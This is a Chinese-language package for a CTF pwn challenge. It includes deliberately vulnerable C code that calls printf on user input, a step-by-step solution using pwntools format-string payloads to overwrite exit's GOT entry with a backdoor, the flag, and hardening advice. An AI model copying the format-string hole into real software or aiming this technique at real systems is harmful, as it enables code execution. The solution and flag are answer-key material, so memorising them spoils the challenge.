# pwn-fmt-write

## 一、题目与考点

| 项 | 值 |
|---|---|
| 难度 | 中 |
| 考点 | 格式化字符串任意写（`%n`）；GOT 表覆写；Partial RELRO |
| 容器端口 | 宿主机 9107 → 容器 1337 |
| Flag | `flag{format_string_arbitrary_write}` |

## 题面（直接复制到平台「简介」）

一个只做"登记名字"的小服务，收完一行就退出。用 `nc <地址> 9107` 连上去，会看到 `name:`。目标：程序里有一个会打印 flag 的函数，从未被调用过，让它跑起来。

**提示**：`objdump -R` 列出的那张表存的是运行时要跳转的函数地址；`checksec` 里 RELRO 那一栏说明它能不能被改写。

## 二、题目描述

```
nc <host> 9107
name:
```

```c
char buf[128];
fgets(buf, sizeof buf, stdin);
printf(buf);      /* 格式化串由输入决定 */
printf("\n");
exit(0);          /* 结尾调用 exit */
```

程序里存在 `backdoor()`（`system("cat /app/flag")`），但从不调用。
`exit` 的 GOT 表项可写（Partial RELRO），把它改成 `backdoor` 即可。

## 三、解题步骤

1. 看保护与地址：

```bash
checksec --file=files/pwn
# Partial RELRO —— .got.plt 可写，这题才成立
objdump -R files/pwn | grep -E 'exit|printf'
# 0000000000404040 R_X86_64_JUMP_SLOT  exit
nm files/pwn | grep backdoor
# 00000000004011d6 T backdoor
```

2. 确认 `buf` 是第几个位置参数：

```python
p.recvuntil(b'name: ')
p.sendline(b'AAAAAAAA' + b'.'.join(b'%%%d$p' % i for i in range(1, 12)))
print(p.recv())
# 第一段输出是 8 个 A，然后第 6 个参数就是 0x4141414141414141
```

`buf` 在 `rbp-0x80`，`printf` 被调用时 `rsp` 也正好是 `rbp-0x80`，
所以 `%6$p` 读到 `buf[0..7]`。偏移 = **6**。

3. 用 pwntools 生成任意写：

```python
payload = fmtstr_payload(6, {0x404040: 0x4011d6}, write_size='byte')
p.sendline(payload)
```

`fmtstr_payload` 会把 `backdoor` 的地址拆成 4 个字节，用 `%hhn` 依次写进
`0x404040, 0x404041, 0x404042, 0x404043`，中间用 `%<n>c` 凑计数。

4. 跑 exp：

```bash
python3 exp/exp.py
```

程序在 `printf` 之后调用 `exit(0)`，实际跳到 `backdoor`，输出 `flag{...}`。

## 四、原理

格式化串里的 `%n` 把"到目前为止输出了多少个字符"写进对应参数指向的地址。
配合 `%hhn`（写 1 字节）可以逐字节写任意值。

本题 `buf` 本身就在第 6 个位置参数的位置，所以把目标地址直接摆在 `buf` 开头，
格式化串里用 `%6$hhn` 就能写到该地址：

```
payload = p32(0x404040) + b'%<值>c%6$hhn'
```

`exit@got` 在 Partial RELRO 下位于 `.got.plt`，可写。程序最后调用 `exit(0)`，
PLT 桩会 `jmp [exit@got]`，跳转目标已被改成 `backdoor`。
换成 `-Wl,-z,relro,-z,now`（Full RELRO）时整张 GOT 只读，这条链断掉。

## 五、防御建议

- 写 `printf("%s", buf)`；编译期 `-Wformat-security -Werror=format-security`。
- 用 Full RELRO：`-Wl,-z,relro,-z,now`，GOT 在 `main` 之前就 `mprotect` 成只读。
- 开启 PIE + ASLR，让目标地址不可预测。
- 不用 `exit` 这类可被劫持的间接跳转收尾，或改用 `_exit`（直接系统调用）。

## 六、附件清单

| 文件 | 说明 |
|---|---|
| `files/pwn` | 与容器内一致的二进制 |
| `src/pwn.c` | 源码 |
| `exp/exp.py` | pwntools 脚本 |
| `Dockerfile` / `entrypoint.sh` / `docker-compose.yml` | 容器 |
| `checker/main.rx` | 判题脚本 |

`checksec`：

```
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
Stripped: No
```

关键地址：`exit@got = 0x404040`，`backdoor = 0x4011d6`，`printf@plt = 0x4010b4`，
格式化串偏移 6。

---

## 平台镜像配置（添加镜像时照这张表填）

| 字段 | 填什么 | 说明 |
|---|---|---|
| 容器名称 | `pwn-fmt-write` | 与题目目录名、tar 文件名保持一致 |
| 镜像标签 | `<registry>/<bucket>/pwn-fmt-write` | 仓库名取自 tar 文件名（去扩展名），上传后 UI 自动带出 |
| 镜像版本 | 上传后生成的 Unix 时间戳 | 下拉选最新那条，不要手填 |
| 镜像拉取策略 | `Always` | 与平台默认一致 |
| 服务描述 | Pwn/交互题（nc 连上去打） | 只是备注，不影响运行 |
| 传输协议 | `tcp` | 全库只有 TCP 服务 |
| 应用协议 | `raw` | 裸 TCP / SSH / socat 选 raw |
| **服务端口** | **`1337`** | 容器内实际监听端口，必须与 Dockerfile 的 `EXPOSE` 一致 |
| CPU 限制 | `0.1, 0.3` | 最小, 最大（核） |
| 内存限制（MB） | `64, 128` | 最小, 最大 |
| 存储限制（MB） | `64, 1024` | 最小, 最大 |
| restricted | **勾选** | 平台会 drop `NET_BIND_SERVICE`，所以容器监听的是 `1337` 而不是 80 |
| 出网 | **关闭** | 本题不需要外网 |

> 端口必须填 **1337**。这是 socat / 裸 TCP 服务的监听端口，选手用 `nc <地址> <映射端口>` 连。
